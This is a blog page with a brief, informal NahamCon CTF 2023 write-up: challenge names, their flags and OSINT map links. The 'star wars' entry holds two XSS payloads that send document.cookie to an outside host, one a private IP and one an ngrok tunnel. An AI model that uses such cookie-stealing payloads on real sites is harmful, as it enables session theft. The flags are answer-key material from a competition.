@@ -1,0 +1,68 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="width=device-width,initial-scale=1.0" name=viewport><title>Nahamcon CTF 2023 | TheMj0ln1r Blog</title><meta content="Nahamcon CTF 2023" property=og:title><meta content="Smart contract engineer at Phoenix Labs (Spark). Notes on DeFi internals, EVM, cross-chain protocols and CTF writeups." name=description><meta content="Smart contract engineer at Phoenix Labs (Spark). Notes on DeFi internals, EVM, cross-chain protocols and CTF writeups." property=og:description><meta content=https://themj0ln1r.github.io/archive/nahamconctf23/ property=og:url><meta media="(prefers-color-scheme: light)" content=#f2f2f0 name=theme-color><meta media="(prefers-color-scheme: dark)" content=#0d1117 name=theme-color><link href=/favicons/favicon.ico rel=icon><link title="TheMj0ln1r Blog" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link as=font crossorigin href=https://themj0ln1r.github.io/fonts/v/inter-normal.woff2 rel=preload type=font/woff2><link href=https://themj0ln1r.github.io/main.css rel=stylesheet><link media="(prefers-color-scheme: light)" href=https://themj0ln1r.github.io/giallo-light.css id=hl-light rel=stylesheet><link media="(prefers-color-scheme: dark)" href=https://themj0ln1r.github.io/giallo-dark.css id=hl-dark rel=stylesheet><script>(function () {
+            var KEY = "theme-storage";
+            function apply(mode) {
+                document.documentElement.dataset.theme = mode;
+                document.getElementById("hl-light").media = mode === "light" ? "all" : "not all";
+                document.getElementById("hl-dark").media = mode === "dark" ? "all" : "not all";
+            }
+            var saved = null;
+            try { saved = localStorage.getItem(KEY); } catch (e) {}
+            apply(saved || (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light"));
+            window.toggleTheme = function () {
+                var next = document.documentElement.dataset.theme === "dark" ? "light" : "dark";
+                try { localStorage.setItem(KEY, next); } catch (e) {}
+                apply(next);
+            };
+        })();</script><script defer src=https://themj0ln1r.github.io/js/codeblock.js></script><script async data-goatcounter=https://themj0ln1r.goatcounter.com/count src=https://themj0ln1r.github.io/js/count.js></script><body><a class=skip-link href=#main>Skip to content</a><header class=site-header><div class="container header-inner"><a class=brand href=https://themj0ln1r.github.io/> <span aria-hidden=true class=brand-mark>>_</span>TheMj0ln1r </a><nav aria-label=Main class=site-nav><a href=https://themj0ln1r.github.io>Writings</a><a href=https://themj0ln1r.github.io/cv>CV</a><a aria-current=page href=https://themj0ln1r.github.io/archive>Archive</a><a href=https://themj0ln1r.github.io/tags>Tags</a><button aria-label="Toggle dark mode" class=theme-toggle onclick=toggleTheme() type=button><svg viewbox="0 0 24 24" aria-hidden=true class=icon-sun height=18 width=18><circle cx=12 cy=12 r=4 /><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg> <svg viewbox="0 0 24 24" aria-hidden=true class=icon-moon height=18 width=18><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button></nav></div></header><main class="container container-wide" id=main><article class=post><header class=post-head><a class=eyebrow href=https://themj0ln1r.github.io/archive/>CTF Archive</a><h1 class=post-title>Nahamcon CTF 2023</h1><div class=post-meta><time datetime=2023-06-19>June 19, 2023</time><span>1 min read</span></div><div class=post-tags><a class=tag href=https://themj0ln1r.github.io/tags/ctf/>ctf</a></div></header><div class=post-grid><div class=prose><p>Hello all! I played <a href=https://ctftime.org/event/2023 target=_blank>NahamCon CTF 2023</a> which was happened from 16 June to 18 June.<p>I solved 10+ challs, A bit busy to write crear writeups, See you again...<p>Dirty writeup.txt used during CTF<pre class="giallo z-code"><code data-lang=plain><span class=giallo-l><span>Blur Glasses</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>	flag½₧8084e4530cf649814456f2a291eb81e9½―</span></span>
+<span class=giallo-l><span>	flag{8084e4530cf649814456f2a291eb81e9}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>Ninety One</span></span>
+<span class=giallo-l><span>	</span></span>
+<span class=giallo-l><span>	Base 91</span></span>
+<span class=giallo-l><span>	flag{dfb88c7d9ca38e71dc27e1072fc43d1b}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>blobber </span></span>
+<span class=giallo-l><span>	solv.py</span></span>
+<span class=giallo-l><span>	Tlag{b93a6292f3491c8e2 f6cdb3addb5 f588}</span></span>
+<span class=giallo-l><span>	flag{b93a6292f3491c8e2f6cdb3addb5f588}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>RSAintro</span></span>
+<span class=giallo-l><span>	solve.py</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>disinfect</span></span>
+<span class=giallo-l><span>	solv.py</span></span>
+<span class=giallo-l><span>	flag{b00acdc78749b378f8f4889f8243789304abe928}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>Open Sesame</span></span>
+<span class=giallo-l><span>	flag{85605e34d3d2623866c57843a0d2c4da}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>jom </span></span>
+<span class=giallo-l><span>	flag{aad9ba9b3fdfa4cc6f7e2e18d0dcbbab}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>JNInjaspeak</span></span>
+<span class=giallo-l><span>	strings</span></span>
+<span class=giallo-l><span>	flag{1f539e4a706e6181dae9db3fad6a78f1}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>star wars</span></span>
+<span class=giallo-l><span>	0.tcp.in.ngrok.io:19073</span></span>
+<span class=giallo-l><span>	&lt;script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);&lt;/script></span></span>
+<span class=giallo-l><span>	&lt;script>var i=new Image(); i.src="https://16c1-103-225-13-242.ngrok-free.app?cookie="+btoa(document.cookie);&lt;/script></span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>OSINT 2</span></span>
+<span class=giallo-l><span>	Medicean fortress, Portoferraio</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>	https://www.google.com/maps/@42.812475,10.3262776,3a,75y,34.04h,87.18t/data=!3m8!1e1!3m6!1sAF1QipMRS4U4f6Q44jxZgF8m04lvq6lcm4aiEScSDmoE!2e10!3e11!6shttps:%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipMRS4U4f6Q44jxZgF8m04lvq6lcm4aiEScSDmoE%3Dw203-h100-k-no-pi-0.46432817-ya247.71796-ro2.4712446-fo100!7i7680!8i3840?entry=ttu</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>	flag{e54fcc18854f0adfdedf22120c346b3a}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>OSINT - 3</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>	https://www.google.com/maps/@40.77165,-73.9758633,3a,75y,198.83h,91.99t/data=!3m8!1e1!3m6!1sAF1QipM4LLrW5CMXbY9Sjfw1fMoL4BeanJ58aABFfdt9!2e10!3e11!6shttps:%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipM4LLrW5CMXbY9Sjfw1fMoL4BeanJ58aABFfdt9%3Dw203-h100-k-no-pi-0-ya168.96263-ro-0-fo100!7i8704!8i4352?entry=ttu</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>OSINT - 4</span></span>
+<span class=giallo-l><span>	Schloss Ebenfurth</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>	https://www.google.com/maps/@47.877623,16.36251,3a,75y,268.04h,78.87t/data=!3m8!1e1!3m6!1sAF1QipM-qSFbaE1r_waaZ7aay0NHN6NLwUf8-lVJtgxA!2e10!3e11!6shttps:%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipM-qSFbaE1r_waaZ7aay0NHN6NLwUf8-lVJtgxA%3Dw203-h100-k-no-pi-10-ya160-ro0-fo100!7i8192!8i4096?entry=ttu</span></span></code></pre><hr></div></div><nav aria-label="More posts" class=post-nav><a class=post-nav-link href=https://themj0ln1r.github.io/archive/n00bzctf23/><span>Older</span>n00b CTF 2023</a><a class="post-nav-link next" href=https://themj0ln1r.github.io/archive/googlectf23/><span>Newer</span>Google CTF 2023</a></nav></article></main><footer class=site-footer><div class="container footer-inner"><span>© 2026 Charan Nomula</span><nav aria-label=Elsewhere class=footer-links><a rel="me noopener" href=https://github.com/TheMj0ln1r/ target=_blank>GitHub</a><a rel="me noopener" href=https://x.com/TheMj0ln1r/ target=_blank>X</a><a rel="me noopener" href=https://linkedin.com/in/mj0ln1r/ target=_blank>LinkedIn</a><a href=https://themj0ln1r.github.io/atom.xml>RSS</a></nav></div></footer>
